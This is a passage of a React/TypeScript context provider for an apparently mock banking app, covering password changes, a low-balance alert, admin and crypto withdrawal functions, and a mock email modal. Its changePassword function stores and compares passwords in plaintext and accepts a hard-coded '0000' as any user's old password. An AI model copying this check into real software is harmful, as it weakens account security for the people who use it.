  const changePassword = (oldPass: string, newPass: string) => {
    if (!currentUser) return false;
    if (currentUser.password !== oldPass && currentUser.password !== '0000') {
       return false; // If old pass doesn't match and isn't the default one (some allow overriding default freely, but let's be strict or just check match)
    }
    
    // We update both users array and currentUser
    setUsers(prev => prev.map(u => u.id === currentUser.id ? { ...u, password: newPass } : u));
    setCurrentUser({ ...currentUser, password: newPass });
    return true;
  };


  

  useEffect(() => {
    if (currentUser && currentUser.role !== 'admin') {
      const updatedUser = users.find(u => u.id === currentUser.id);
      if (!updatedUser) {
        setCurrentUser(null);
      } else if (updatedUser.status !== 'active') {
        setCurrentUser(null);
      } else if (JSON.stringify(updatedUser) !== JSON.stringify(currentUser)) {
        setCurrentUser(updatedUser);
      }
    }
  }, [users, currentUser]);

  // Alert system for low balance
  useEffect(() => {
    if (currentUser && currentUser.role === 'user') {
      const totalBalance = currentUser.accounts.reduce((sum, acc) => sum + acc.balance, 0);
      if (totalBalance < adminSettings.alertThreshold) {
        // We can just log or show alert. Let's create a toast function later.
        console.warn(`ALERT: Balance below threshold ${adminSettings.alertThreshold}`);
      }
    }
  }, [currentUser, users, adminSettings.alertThreshold]);

  
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && mockEmail) {
        setMockEmail(null);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [mockEmail]);
  if (isInitializing) {
    return <div className="flex items-center justify-center min-h-screen bg-background text-foreground"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div></div>;
  }

  return (
    <BankContext.Provider value={{
      users, currentUser, transactions, adminSettings, virtualCards, loanApplications, userApplications, grantApplications, contactInquiries, createVirtualCard, updateVirtualCardStatus, deleteVirtualCard, createLoanApplication, updateLoanApplicationStatus, updateUserApplicationStatus, createGrantApplication, updateGrantApplicationStatus,
      login, loginAsAdmin, logout, register, adminCreateUser, updateUserProfilePicture, adminUpdateUser, updateUserStatus, deleteUser, updateUserCardVisibility,
      updateBalance, createTransaction, updateTransactionStatus, updateAdminSettings, changePassword, createContactInquiry, deleteContactInquiry, updateContactInquiryStatus, sendMockEmail, investments, createInvestment, updateInvestment, deleteInvestment, reinvestProfit, adminAdjustInvestmentDuration,
      cryptoWithdrawals, requestCryptoWithdrawal, approveCryptoWithdrawal, rejectCryptoWithdrawal,
      cryptoOrders, requestCryptoTradeOrder, approveCryptoTradeOrder, rejectCryptoTradeOrder
    }}>
      {children}
      {mockEmail && (
        <div 
          className="fixed inset-0 z-[150] flex items-center justify-center p-3 sm:p-4 bg-background/80 backdrop-blur-sm"
          onClick={(e) => { if (e.target === e.currentTarget) setMockEmail(null); }}
        >
          <div className="bg-card border border-border w-full max-w-lg rounded-2xl shadow-2xl relative animate-in fade-in zoom-in duration-200 overflow-hidden flex flex-col max-h-[92vh]">
            {/* Header with prominent Move Back arrow */}
            <div className="p-4 sm:px-6 border-b border-border bg-emerald-500/10 flex items-center justify-between gap-3 sticky top-0 z-10">
              <button 
                id="email-modal-back-btn"
                onClick={() => setMockEmail(null)} 
                className="flex items-center gap-2 text-xs sm:text-sm font-bold text-foreground hover:text-foreground bg-background/90 hover:bg-background border border-border px-3 py-1.5 rounded-xl transition-all shadow-sm group active:scale-95"
                title="Move back to previous page"
              >
                <ArrowLeft size={16} className="text-foreground group-hover:-translate-x-1 transition-transform" />
                <span>Move Back</span>
              </button>

              <div className="flex items-center gap-2 text-emerald-500 font-bold text-xs sm:text-sm">
                <Mail size={17} className="shrink-0" />
                <span className="truncate">Email Notification</span>
              </div>

              <button 
                onClick={() => setMockEmail(null)} 
                className="text-foreground/50 hover:text-foreground transition-colors p-1.5 bg-background/80 hover:bg-background rounded-lg border border-border/50 flex items-center"
                title="Close"
              >
                <X size={16} />
              </button>
            </div>

            {/* Email Body */}
            <div className="p-4 sm:p-6 overflow-y-auto space-y-4">
              <div>
                <div className="text-[11px] text-foreground/50 uppercase tracking-widest font-bold mb-1">To</div>
                <div className="text-xs sm:text-sm text-foreground font-mono bg-background/60 p-2.5 rounded-xl border border-border/60 break-all">{mockEmail.to}</div>
              </div>
              
              <div>
                <div className="text-[11px] text-foreground/50 uppercase tracking-widest font-bold mb-1">Subject</div>
                <div className="text-sm sm:text-base font-bold text-foreground bg-background/60 p-2.5 rounded-xl border border-border/60 leading-snug">{mockEmail.subject}</div>
              </div>
              
              <div>
                <div className="text-[11px] text-foreground/50 uppercase tracking-widest font-bold mb-1">Message Content</div>
                <div className="text-xs sm:text-sm text-foreground/85 whitespace-pre-line leading-relaxed bg-background p-4 rounded-xl border border-border/70 font-sans">
                  {mockEmail.body}
                </div>
              </div>
              
              {/* Footer action buttons including Move Back */}
              <div className="flex flex-col sm:flex-row items-center gap-3 pt-3 border-t border-border/50">
                <button 
                  id="email-modal-bottom-back-btn"
                  onClick={() => setMockEmail(null)} 
                  className="w-full sm:flex-1 py-2.5 sm:py-3 bg-card border border-border text-foreground font-bold rounded-xl hover:bg-foreground/5 transition-all flex items-center justify-center gap-2 text-xs sm:text-sm shadow-sm"
                >
                  <ArrowLeft size={16} />
                  <span>Move Back</span>
                </button>
                <button 
                  onClick={() => setMockEmail(null)} 
                  className="w-full sm:flex-1 bg-primary text-white font-bold py-2.5 sm:py-3 rounded-xl hover:bg-primary/90 transition-all shadow-lg shadow-primary/20 text-xs sm:text-sm"
                >
                  Dismiss / Done
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </BankContext.Provider>
  );
}


export const useBank = () => {
  const context = useContext(BankContext);
  if (!context) throw new Error('useBank must be used within a BankProvider');
  
  return context;
};
